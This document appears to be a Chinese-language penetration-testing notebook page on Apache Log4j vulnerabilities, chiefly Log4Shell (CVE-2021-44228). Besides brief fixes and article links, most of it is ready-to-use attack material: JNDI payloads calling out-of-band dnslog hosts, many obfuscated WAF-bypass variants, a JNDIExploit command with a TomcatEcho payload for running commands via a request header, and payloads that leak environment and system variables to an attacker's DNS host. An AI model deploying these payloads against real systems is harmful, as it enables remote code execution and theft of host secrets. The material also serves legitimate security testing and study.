# Log4j

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

> 项目地址 : https://github.com/apache/logging-log4j2

**相关文章**
- [Log4j2系列漏洞分析汇总](https://mp.weixin.qq.com/s/0sqTEQwOZ-TJeqpq-ExWTg)

---

## CVE-2019-17571 log4j<=1.2.17反序列化漏洞

**相关文章**
- [log4j<=1.2.17反序列化漏洞（CVE-2019-17571）分析](https://mp.weixin.qq.com/s/RLvvzKbBwKp-War98pvn9w)

---

## CVE-2021-44228

**描述**

由于 Apache Log4j2 lookup 功能存在递归解析功能，攻击者可直接构造恶意请求，当程序将用户输入的数据进行日志记录时, ⽆需进⾏特殊配置，即可触发远程代码执⾏。

Apache Struts2、Apache Solr、Apache Druid、Apache Flink 等众多组件与大型应用均受影响

**影响范围**
- Apache Log4j 2.x < 2.15.0-rc2
- [VMware 多个产品 Log4j2 RCE](https://mp.weixin.qq.com/s/ThSxC22JsrRE50N21WR24Q)
- [YfryTchsGD/Log4jAttackSurface](https://github.com/YfryTchsGD/Log4jAttackSurface)
- https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592

**相关文章**
- [Log4j2 RCE分析](https://mp.weixin.qq.com/s/kLuPx0zXRIl6y1ds6n5e_w)
- [甲方需谨慎对待log4shell漏洞的修复](https://mp.weixin.qq.com/s/Jaq5NTwqBMX7mKMklDnOtA)
- [CVE-2021-44228 log4j2 回显操作](https://www.o2oxy.cn/3893.html)
- [一洞一世界，一大一团灭，翻车的log4j2](https://mp.weixin.qq.com/s/-SV45eVKjCBDDftLC3Pf4Q)
- [Apache Log4j2从RCE到RC1绕过](https://mp.weixin.qq.com/s/8lvpSetHUpCCL5IRcvdTCw)
- [Log4Shell: RCE 0-day exploit found in log4j 2, a popular Java logging package](https://www.lunasec.io/docs/blog/log4j-zero-day/)
- [log4j 漏洞一些特殊的利用方式](https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg)
- [整理log4j bypass](https://mp.weixin.qq.com/s/Rd8-Atvyaac93ak4Iz8HTQ)
- [从零到一带你深入 log4j2 Jndi RCE CVE-2021-44228漏洞](https://mp.weixin.qq.com/s/4MP0WVDOT5YhpOJ5KkGxYw)
- [Log4j和它的小伙伴们](https://mp.weixin.qq.com/s/VGMxrw8HD2ZbQHpyL-V_nQ)
- [Log4j2 研究之lookup](https://mp.weixin.qq.com/s/K74c1pTG6m5rKFuKaIYmPg)
- [Log4j2 0day 攻击面分析](https://mp.weixin.qq.com/s/-HJ6BqyAsSYpV3_X0ItC2w)
- https://github.com/vulhub/vulhub/blob/master/log4j/CVE-2021-44228/README.zh-cn.md

**修复方案**
- 设置系统环境变量 LOG4J_log4j2_formatMsgNoLookups=True
- 升级 Apache Log4j2 所有相关应用到最新版本，地址 https://github.com/apache/logging-log4j2/tags
- [Cybereason/Logout4Shell](https://github.com/Cybereason/Logout4Shell)

**检测 payload**

```
${jndi:ldap://xxx.dnslog.cn/a}
${jndi:rmi://xxx.dnslog.cn/a}
```

- [jas502n/Log4j2-CVE-2021-44228](https://github.com/jas502n/Log4j2-CVE-2021-44228)
- [Puliczek/CVE-2021-44228-PoC-log4j-bypass-words](https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words)

**一些 bypass**

```
# RC1 绕过
${jndi:ldap://127.0.0.1:1389/ Badclassname}

# bypass WAF
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://xxx.dnslog.cn/poc}
${${::-j}ndi:rmi://xxx.dnslog.cn/ass}
${${lower:jndi}:${lower:rmi}://xxx.dnslog.cn/poc}
${${lower:${lower:jndi}}:${lower:rmi}://xxx.dnslog.cn/poc}
${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://xxx.dnslog.cn/poc}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxx.dnslog.cn/poc}
${${env:foo:-jndi}:ldap://xxx.dnslog.cn/a}

${${lower:jnd}${lower:${upper:ı}}:ldap://...}

${jndi:${lower:l}${lower:d}a${lower:p}://example.com/

${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//your.burpcollaborator.net/a}

${j${lower:n}d${lower:i}${lower::}${lower:l}d${lower:a}p${lower::}${lower:/}/${lower:1}${lower:2}${lower:7}.${lower:0}${lower:.}${lower:0}${lower:.}${lower:1}${lower::}${lower:1}0${lower:9}${lower:9}/${lower:o}${lower:b}j}

${${::-j}ndi:rmi://127.0.0.1:1389/ass}

${${lower:jndi}:${lower:rmi}://q.w.e/poc}

${${lower:${lower:jndi}}:${lower:rmi}://a.s.d/poc}

${${upper:j}${lower:n}${lower:d}${lower:i}${lower::}${lower:l}${lower:d}${lower:a}${lower:p}${lower::}${lower:/}${lower:/}${lower:1}${lower:2}${lower:7}${lower:.}${lower:0}${lower:.}${lower:0}${lower:.}${lower:1}${lower::}${lower:1}${lower:0}${lower:9}${lower:9}${lower:/}${lower:o}${lower:b}${lower:j}}

${${nuDV:CW:yqL:dWTUHX:-j}n${obpOW:C:-d}${ll:-i}:${GI:-l}d${YRYWp:yjkg:wrsb:RajYR:-a}p://${RHe:-1}2${Qmox:dC:MB:-7}${ucP:yQH:xYtT:WCVX:-.}0.${WQRvpR:ligza:J:DSBUAv:-0}.${v:-1}:${p:KJ:-1}${Ek:gyx:klkQMP:-0}${UqY:cE:LPJtt:L:ntC:-9}${NR:LXqcg:-9}/o${fzg:rsHKT:-b}j}

${${uPBeLd:JghU:kyH:C:TURit:-j}${odX:t:STGD:UaqOvq:wANmU:-n}${mgSejH:tpr:zWlb:-d}${ohw:Yyz:OuptUo:gTKe:BFxGG:-i}${fGX:L:KhSyJ:-:}${E:o:wsyhug:LGVMcx:-l}${Prz:-d}${d:PeH:OmFo:GId:-a}${NLsTHo:-p}${uwF:eszIV:QSvP:-:}${JF:l:U:-/}${AyEC:rOLocm:-/}${jkJFS:r:xYzF:Frpi:he:-1}${PWtKH:w:uMiHM:vxI:-2}${a:-7}${sKiDNh:ilypjq:zemKm:-.}${QYpbY:P:dkXtCk:-0}${Iwv:TmFtBR:f:PJ:-.}${Q:-0}${LX:fMVyGy:-.}${lS:Mged:X:th:Yarx:-1}${xxOTJ:-:}${JIUlWM:-1}${Mt:Wxhdp:Rr:LuAa:QLUpW:-0}${sa:kTPw:UnP:-9}${HuDQED:-9}${modEYg:UeKXl:YJAt:pAl:u:-/}${BPJYbu:miTDQJ:-o}${VLeIR:VMYlY:f:Gaso:cVApg:-b}${sywJIr:RbbDTB:JXYr:ePKz:-j}}

${j${lower:n}d${lower:i}${lower::}${lower:l}d${lower:a}p${lower::}${lower:/}/${lower:1}${lower:2}${lower:7}.${lower:0}${lower:.}${lower:0}${lower:.}${lower:1}${lower::}${lower:1}0${lower:9}${lower:9}/${lower:o}${lower:b}j}

${${upper:j}${lower:n}${lower:d}${lower:i}${lower::}${lower:l}${lower:d}${lower:a}${lower:p}${lower::}${lower:/}${lower:/}${lower:1}${lower:2}${lower:7}${lower:.}${lower:0}${lower:.}${lower:0}${lower:.}${lower:1}${lower::}${lower:1}${lower:0}${lower:9}${lower:9}${lower:/}${lower:o}${lower:b}${lower:j}}

${${nuDV:CW:yqL:dWTUHX:-j}n${obpOW:C:-d}${ll:-i}:${GI:-l}d${YRYWp:yjkg:wrsb:RajYR:-a}p://${RHe:-1}2${Qmox:dC:MB:-7}${ucP:yQH:xYtT:WCVX:-.}0.${WQRvpR:ligza:J:DSBUAv:-0}.${v:-1}:${p:KJ:-1}${Ek:gyx:klkQMP:-0}${UqY:cE:LPJtt:L:ntC:-9}${NR:LXqcg:-9}/o${fzg:rsHKT:-b}j}

${${uPBeLd:JghU:kyH:C:TURit:-j}${odX:t:STGD:UaqOvq:wANmU:-n}${mgSejH:tpr:zWlb:-d}${ohw:Yyz:OuptUo:gTKe:BFxGG:-i}${fGX:L:KhSyJ:-:}${E:o:wsyhug:LGVMcx:-l}${Prz:-d}${d:PeH:OmFo:GId:-a}${NLsTHo:-p}${uwF:eszIV:QSvP:-:}${JF:l:U:-/}${AyEC:rOLocm:-/}${jkJFS:r:xYzF:Frpi:he:-1}${PWtKH:w:uMiHM:vxI:-2}${a:-7}${sKiDNh:ilypjq:zemKm:-.}${QYpbY:P:dkXtCk:-0}${Iwv:TmFtBR:f:PJ:-.}${Q:-0}${LX:fMVyGy:-.}${lS:Mged:X:th:Yarx:-1}${xxOTJ:-:}${JIUlWM:-1}${Mt:Wxhdp:Rr:LuAa:QLUpW:-0}${sa:kTPw:UnP:-9}${HuDQED:-9}${modEYg:UeKXl:YJAt:pAl:u:-/}${BPJYbu:miTDQJ:-o}${VLeIR:VMYlY:f:Gaso:cVApg:-b}${sywJIr:RbbDTB:JXYr:ePKz:-j}}
```

**TomcatEcho 回显方法**
```
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i xx.xx.xx.xx -l 8899 -p 9988
```

```
${jndi:ldap://xx.xx.xx.xx:8899/Deserialization/CommonsBeanutils2/TomcatEcho}

header 头里带下
cmd: ls
```

**信息带外**

高版本不能rce了，但通过 sys 和 env 协议，结合 jndi 可以读取到一些环境变量和系统变量，特定情况下可能可以读取到系统密码

举个例子
```
${jndi:ldap://${env:LOGNAME}.eynz6t.dnslog.cn}
${jndi:ldap://${sys:os.name}.eynz6t.dnslog.cn}
${jndi:ldap://${sys:java.version}.eynz6t.dnslog.cn}
```

常见带外
```
${ctx:loginId}
${map:type}
${filename}
${date:MM-dd-yyyy}
${docker:containerId}
${docker:containerName}
${docker:imageName}
${env:USER}
${event:Marker}
${mdc:UserId}
${java:runtime}
${java:vm}
${java:os}
${jndi:logging/context-name}
${hostName}
${docker:containerId}
${k8s:accountName}
${k8s:clusterName}
${k8s:containerId}
${k8s:containerName}
${k8s:host}
${k8s:labels.app}
${k8s:labels.podTemplateHash}
${k8s:masterUrl}
${k8s:namespaceId}
${k8s:namespaceName}
${k8s:podId}
${k8s:podIp}
${k8s:podName}
${k8s:imageId}
${k8s:imageName}
${log4j:configLocation}
${log4j:configParentLocation}
${spring:spring.application.name}
${main:myString}
${main:0}
${main:1}
${main:2}
${main:3}
${main:4}
${main:bar}
${name}
${marker}
${marker:name}
${spring:profiles.active[0]
${sys:logPath}
${web:rootDir}
```

来自 https://github.com/jas502n/Log4j2-CVE-2021-44228
```
# java
${java:version}
${java:runtime}
${java:vm}
${java:os}
${java:hw}
${java:locale}

# linux
${env:CLASSPATH}
${env:HOME}
${env:JAVA_HOME}
${env:LANG}
${env:LC_TERMINAL}
${env:LC_TERMINAL_VERSION}
${env:LESS}
${env:LOGNAME}
${env:LSCOLORS}
${env:LS_COLORS}
${env:MAIL}
${env:NLSPATH}
${env:OLDPWD}
${env:PAGER}
${env:PATH}
${env:PWD}
${env:SHELL}
${env:SHLVL}
${env:SSH_CLIENT}
${env:SSH_CONNECTION}
${env:SSH_TTY}
${env:TERM}
${env:USER}
${env:XDG_RUNTIME_DIR}
${env:XDG_SESSION_ID}
${env:XFILESEARCHPATH}
${env:ZSH}

# windows
${env:A8_HOME}
${env:A8_ROOT_BIN}
${env:ALLUSERSPROFILE}
${env:APPDATA}
${env:CATALINA_BASE}
${env:CATALINA_HOME}
${env:CATALINA_OPTS}
${env:CATALINA_TMPDIR}
${env:CLASSPATH}
${env:CLIENTNAME}
${env:COMPUTERNAME}
${env:ComSpec}
${env:CommonProgramFiles}
${env:CommonProgramFiles(x86)}
${env:CommonProgramW6432}
${env:FP_NO_HOST_CHECK}
${env:HOMEDRIVE}
${env:HOMEPATH}
${env:JRE_HOME}
${env:Java_Home}
${env:LOCALAPPDATA}
${env:LOGONSERVER}
${env:NUMBER_OF_PROCESSORS}
${env:OS}
${env:PATHEXT}
${env:PROCESSOR_ARCHITECTURE}
${env:PROCESSOR_IDENTIFIER}
${env:PROCESSOR_LEVEL}
${env:PROCESSOR_REVISION}
${env:PROMPT}
${env:PSModulePath}
${env:PUBLIC}
${env:Path}
${env:ProgramData}
${env:ProgramFiles}
${env:ProgramFiles(x86)}
${env:ProgramW6432}
${env:SESSIONNAME}
${env:SystemDrive}
${env:SystemRoot}
${env:TEMP}
${env:TMP}
${env:ThisExitCode}
${env:USERDOMAIN}
${env:USERNAME}
${env:USERPROFILE}
${env:WORK_PATH}
${env:windir}
${env:windows_tracing_flags}
${env:windows_tracing_logfile}
```

---

## CVE-2021-45046

**相关文章**
- [Apache Log4j2拒绝服务漏洞分析](https://xz.aliyun.com/t/10670)
